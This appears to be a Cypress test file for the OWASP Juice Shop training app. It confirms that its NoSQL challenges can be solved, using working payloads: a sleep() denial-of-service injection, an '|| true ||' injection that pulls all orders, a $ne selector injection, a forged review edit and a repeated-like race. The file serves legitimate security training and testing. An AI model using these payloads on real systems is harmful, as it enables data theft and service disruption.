describe('/rest/products/reviews', () => {
  beforeEach(() => {
    cy.visit('/#/search')
  })

  describe('challenge "NoSQL DoS"', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'admin123' })
    })
    it('should be possible to inject a command into the get route', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.window().then(() => {
            void fetch(
              `${Cypress.config('baseUrl')}/rest/products/sleep(1000)/reviews`,
              {
                method: 'GET',
                headers: {
                  'Content-type': 'text/plain'
                }
              }
            )
          })
          cy.expectChallengeSolved({ challenge: 'NoSQL DoS' })
        }
      })
    })
  })

  describe('challenge "NoSQL Exfiltration"', () => {
    it('should be possible to inject and get all the orders', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.window().then(async () => {
            await fetch(
              `${Cypress.config('baseUrl')}/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27`,
              {
                method: 'GET',
                headers: {
                  'Content-type': 'text/plain'
                }
              }
            )
          })
          cy.expectChallengeSolved({ challenge: 'NoSQL Exfiltration' })
        }
      })
    })
  })

  describe('challenge "NoSQL Manipulation"', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'admin123' })
    })

    it('should not be possible to inject a selector into the update route', () => {
      cy.window().then((win) => {
        cy.request({
          method: 'PATCH',
          url: `${Cypress.config('baseUrl')}/rest/products/reviews`,
          headers: {
            'Content-type': 'application/json',
            Authorization: `Bearer ${win.localStorage.getItem('token')}`
          },
          body: {
            id: { $ne: -1 },
            message: 'NoSQL Injection!'
          },
          failOnStatusCode: false
        }).its('status').should('eq', 400)
      })
    })
  })

  describe('challenge "Forged Review"', () => {
    beforeEach(() => {
      cy.login({ email: 'mc.safesearch', password: 'Mr. N00dles' })
    })

    it('should not be possible to edit another user\'s review', () => {
      cy.visit('/')
      cy.request(`${Cypress.config('baseUrl')}/rest/products/1/reviews`).then((reviewsResponse) => {
        const reviewId = reviewsResponse.body.data[0]._id
        cy.window().then((win) => {
          cy.request({
            method: 'PATCH',
            url: `${Cypress.config('baseUrl')}/rest/products/reviews`,
            headers: {
              'Content-type': 'application/json',
              Authorization: `Bearer ${win.localStorage.getItem('token')}`
            },
            body: { id: reviewId, message: 'injected' }
          }).its('body.modified').should('eq', 0)
        })
      })
    })
  })

  describe('challenge "Multiple Likes"', () => {
    beforeEach(() => {
      cy.login({ email: 'mc.safesearch', password: 'Mr. N00dles' })
    })

    it('should be possible to like reviews multiple times', () => {
      cy.visit('/')
      cy.window().then(async () => {
        async function sendPostRequest (reviewId: string) {
          const anotherResponse = await fetch(
            `${Cypress.config('baseUrl')}/rest/products/reviews`,
            {
              method: 'POST',
              headers: {
                'Content-type': 'application/json',
                Authorization: `Bearer ${localStorage.getItem('token')}`
              },
              body: JSON.stringify({ id: reviewId })
            }
          )
          if (anotherResponse.status === 200) {
            console.log('Success')
          }
        }

        const response = await fetch(
          `${Cypress.config('baseUrl')}/rest/products/1/reviews`,
          {
            method: 'GET',
            headers: {
              'Content-type': 'text/plain'
            }
          }
        )
        if (response.status === 200) {
          const responseJson = await response.json()
          const reviewId = responseJson.data[0]._id

          void sendPostRequest(reviewId)
          void sendPostRequest(reviewId)
          void sendPostRequest(reviewId)
        }
      })
      cy.expectChallengeSolved({ challenge: 'Multiple Likes' })
    })
  })
})
